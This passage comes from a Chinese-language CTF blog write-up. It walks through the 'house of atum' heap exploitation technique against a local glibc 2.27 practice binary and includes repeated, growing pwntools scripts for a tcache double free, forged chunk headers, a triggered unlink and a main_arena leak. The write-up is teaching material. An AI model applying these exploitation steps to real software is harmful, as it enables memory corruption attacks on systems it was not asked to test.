class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>到这里我们先思考一个问题，这边我们的<code>notes</code>只能是申请两个堆块，这时我们就要先仔细思考一下，我们只申请一个堆块，就只对这个堆块进行利用是否可以。我们会发现当我们只申请一个堆块，就来进行<code>house of atum</code>的利用时，虽然我们可以修改到我们所申请堆块的<code>prev_size</code>位和<code>size</code>位，但是这对后续就会出现死路一条。</li><li>首先我们一开始申请的<code>0x250</code>这个堆块是与输入输出缓冲区有关的，而在我们申请堆块相邻高地址处就是<code>top_chunk</code>了。</li><li>这时就会出现一个问题，我们没办法修改相邻的两个堆块中的内容，这时如果我们修改了<code>中间chunk</code>的<code>prev_size</code>和<code>size</code>位，进行一些<code>unlink</code>等操作就会报错，因为我们没办法修改其他堆块从而绕过检查。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326131739609.png" alt="image-20250326131739609"></p><ul><li>这个时候我们就需要先申请两个堆块了，其中<code>idx=0</code>是我们要进行<code>house of atum</code>利用的堆块。而<code>idx=1</code>对应的堆块是帮助我们绕过检查的堆块。</li><li>然后我们将<code>idx=1</code>对应的堆块，在<code>fd偏移0x30到0x40</code>这个地址处写入<code>payload = p64(0)*7+p64(0x11)</code>，因为<code>tcache</code>一开始设计就是为了<code>提高堆分配的效率</code>，所以当我们释放<code>idx=1</code>对应的堆块时，它被放入<code>tcachebin</code>中，但是里面写入的数据还是存在的。所以我们就可以利用这个一特性先写入<code>payload = p64(0)*7+p64(0x11)</code>，这样我们在之后修改它相邻低地址堆块对应的<code>prev_size和size位</code>时就可以绕过<code>unlink</code>这个检查。此时堆中内容如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326193531005.png" alt="image-20250326193531005"></p><ul><li>在做完绕过准备后，我们先要泄露出堆块的地址，这样我们再能进行<code>house of atum</code>这个利用，这时我们先连续释放<code>2</code>个<code>idx=0</code>对应的堆块，释放之后，这个堆块对应的<code>fd</code>指针，就是指向自己堆块结构中<code>fd</code>指针的地址。如下图所示</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194009607.png" alt="image-20250326194009607"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194020690.png" alt="image-20250326194020690"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194116301.png" alt="image-20250326194116301"></p><ul><li>接下来我们就可以进行<code>house of atum</code>的利用了<ul><li>我们先释放<code>idx=1</code>处的堆块，因为如果<code>idx=1</code>处的堆块没有被释放，我们就不能连续申请两个堆块，就没办法利用<code>house of atum</code>了。</li><li>先释放<code>idx=1</code>处的堆块后，再释放<code>5</code>次<code>idx=0</code>处的堆块就行。</li><li>第<code>5</code>次释放<code>idx=0</code>处的堆块时，要将<code>notes[0]</code>处的元素设置为<code>0</code>，这样做也是为了后续我们能连续申请两个堆块。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>操作所对应的<code>exp</code>，操作完之后我们再看一下对应的内存，发现堆块的布局如下<code>我们连续释放的堆块已经被放入fastbin中，并且其fd指针已经被设置为0了</code></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194449782.png" alt="image-20250326194449782"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194935684.png" alt="image-20250326194935684"></p><ul><li>并且此时我们发现，我们之前写入的<code>0x11</code>还保留在对应的堆块中。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326195020891.png" alt="image-20250326195020891"></p><ul><li>这时我们就可以进行<code>house of atum</code>的利用</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br></pre></td></tr></table></figure><ul><li>先申请一个堆块，将这个堆块的<code>fd</code>指针修改为<code>chunk_addr = chunk_addr -0x10 - 0x20</code>，也就是这个位置</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326195231451.png" alt="image-20250326195231451"></p><ul><li>然后我们再申请一个堆块，这个堆块的内容随便填一下，这样我们就可以得到如下的<code>bins</code>，我们会发现<code>0x*****240</code>即上图中对应红框框起来的下面一个位置，已经被放入到了<code>tcachebin</code>中。</li><li>但是此时我们的<code>idx=0</code>和<code>idx=1</code>都有堆块存放了，所以我们这时需要释放一个堆块，才能将放入<code>tcachebin</code>中的堆块给申请回来。而释放<code>idx=0</code>或者<code>idx=1</code>其中一个都没什么问题，他们指向的都是<code>0x******260</code>，并且存放<code>0x50</code>大小的堆块对应的<code>tcachebin</code>已经存满<code>7</code>块了，所以我们释放这两个堆块的其中一个，都会被放入<code>fastbin</code>中。我们选择释放掉<code>idx=1</code></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326195531366.png" alt="image-20250326195531366"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326200336719.png" alt="image-20250326200336719"></p><ul><li>释放完<code>idx=1</code>后，我们就可以将对应的<code>0x******240</code>这个堆块给申请回来，并且就可以从<code>0x******240</code>开始往里面写数据，在写数据的时候可以覆盖到原来我们堆块的<code>prev_size</code>和<code>size</code>位。这时我们就可以保持<code>prev_size=0x0</code>并且<code>size=0x91</code>为我们后续触发<code>unlink</code>操作做准备。我们计算<code>0x91</code>这个位置，刚好就是下图所示的范围。</li><li>此时我们<code>idx=1</code>指向的地址为<code>0x*****240</code>，<code>idx=0</code>指向的地址为<code>0x********260</code></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326200915924.png" alt="image-20250326200915924"></p><ul><li>接下来我们就要实现在<code>tcachebin</code>下的如何触发<code>unlink</code></li><li>首先我们需要让<code>tcachebin</code>对应的位置存满<code>7</code>个堆块，然后我们第<code>8</code>次释放后就会放入<code>fastbin</code>中，并且查看是否能合并，如果能和其他相邻的堆块合并，就会进行合并操作，合并后的堆块就会被放入<code>unsortedbin</code>这个堆块中。所有我们就要释放<code>idx=0</code>对应的堆块<code>8</code>次</li><li>这里还要注意下，在第<code>8</code>次释放的时候，我们要将<code>notes[0]</code>中的数据设置为<code>0</code>。这样我们之后才能申请堆块。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>我们来查看效果，<code>unlink</code>后的<code>bins</code>和堆内存。我们发现图中的堆块已经成功被触发了<code>unlink</code>操作。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326201753407.png" alt="image-20250326201753407"></p><ul><li>并且我们发现放入<code>unsortedbin</code>中的堆块，<code>fd</code>、<code>bk</code>对应的值为<code>main_arena+96</code>的位置，由于<code>notes[0]</code>处的元素已经被设置为<code>0</code>了这时我们就可以使用<code>show(1)</code>来泄露堆块</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326201944561.png" alt="image-20250326201944561"></p><ul><li>接下来就是泄露操作了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 